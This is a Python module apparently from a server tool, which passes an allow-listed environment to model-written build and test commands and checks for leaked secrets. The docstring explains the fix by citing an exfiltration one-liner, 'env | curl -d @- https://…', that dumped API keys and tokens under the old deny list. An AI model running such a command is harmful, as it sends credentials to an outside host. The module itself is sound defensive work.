"""The environment a project's own commands are allowed to see.

This module exists because of one sentence: the build gate runs ``build_cmd`` and
``test_cmd``, and those strings are *written by a model*. On a machine of your own that
is merely how the tool works. On a server that strangers sign up to, it is the whole
attack surface -- and the environment was the easiest way through it.

It used to be a **deny list**: take the server's environment, remove the six variables
that point at Slipwright's own Python, hand over the rest. Everything nobody thought to
name came through, including ``ANTHROPIC_API_KEY``, ``GH_TOKEN`` and
``SLIPWRIGHT_SECRET_KEY`` -- the key that decrypts every stored credential of every
account. A ``test_cmd`` of ``env | curl -d @- https://…`` was enough.

It is now an **allow list**. A variable a project genuinely needs is named here, and a
secret added to the server tomorrow is not visible to anything by default. That is the
difference between a list that has to be right forever and one that has to be right once.
"""

from __future__ import annotations

import os
from collections.abc import Mapping, Sequence

#: What a build actually needs, and nothing else.
#:
#: * ``PATH`` -- to find the compiler, the package manager, the test runner.
#: * ``HOME`` -- toolchains keep their caches under it; without one they write to ``/``.
#: * the locale -- so output is not mojibake, and sorting is stable.
#: * ``TZ`` -- tests that format a date are otherwise at the mercy of the host.
#: * ``CI`` -- what every test runner reads to turn off colour and interactivity.
#: * ``TERM``/``COLUMNS`` -- so tools that draw progress bars behave.
#: * the Windows trio -- a Windows host cannot resolve a path without them.
ALLOWED = (
    "PATH",
    "HOME",
    "LANG",
    "LC_ALL",
    "LC_CTYPE",
    "TZ",
    "CI",
    "TERM",
    "COLUMNS",
    # Windows: without these, spawning anything at all fails
    "SYSTEMROOT",
    "WINDIR",
    "COMSPEC",
    "PATHEXT",
    "TEMP",
    "TMP",
    "NUMBER_OF_PROCESSORS",
    "PROCESSOR_ARCHITECTURE",
    "USERPROFILE",
    "APPDATA",
    "LOCALAPPDATA",
    "PROGRAMFILES",
    "PROGRAMFILES(X86)",
    "PROGRAMDATA",
)

#: Slipwright's own Python environment. Named separately because these must be stripped
#: from ``PATH`` as well: with them, a project's ``uv sync`` would install into -- and
#: wipe -- the environment the server itself runs from.
OWN_ENVIRONMENT = (
    "VIRTUAL_ENV",
    "UV_PROJECT_ENVIRONMENT",
    "UV_PYTHON",
    "PYTHONPATH",
    "PYTHONHOME",
    "CONDA_PREFIX",
)


def project_env(
    extra: Mapping[str, str] | None = None,
    *,
    source: Mapping[str, str] | None = None,
    allow: Sequence[str] = ALLOWED,
) -> dict[str, str]:
    """The environment a project's build, test or run command gets.

    Only the named variables, never the rest. ``extra`` adds what this particular run
    needs -- the port a live environment should listen on, say -- and is the only way
    anything else gets in.
    """
    came_from = os.environ if source is None else source
    env = {name: came_from[name] for name in allow if name in came_from}
    env.setdefault("CI", "1")
    venv = came_from.get("VIRTUAL_ENV")
    if venv and "PATH" in env:
        # the activation put the venv's bin directory first; take it out again
        parts = [p for p in env["PATH"].split(os.pathsep) if not p.startswith(venv)]
        env["PATH"] = os.pathsep.join(parts)
    if extra:
        env.update(extra)
    return env


def leaks(env: Mapping[str, str], secrets: Sequence[str]) -> list[str]:
    """Which of these secret values appear in an environment. For tests and for a check
    at startup: the answer must always be none."""
    wanted = {s for s in secrets if s}
    return sorted({value for value in env.values() if value in wanted})


__all__ = ["ALLOWED", "OWN_ENVIRONMENT", "leaks", "project_env"]
